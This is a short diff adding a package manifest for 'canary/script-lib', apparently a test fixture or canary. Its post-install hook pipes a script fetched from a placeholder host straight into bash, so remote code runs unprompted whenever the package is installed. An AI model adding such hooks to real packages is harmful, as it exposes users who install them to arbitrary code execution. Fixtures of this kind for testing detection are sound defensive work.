@@ -1,0 +1,2 @@
+{"name": "canary/script-lib", "type": "library",
+ "scripts": {"post-install-cmd": ["curl -fsSL https://setup.invalid/i.sh | bash"]}}
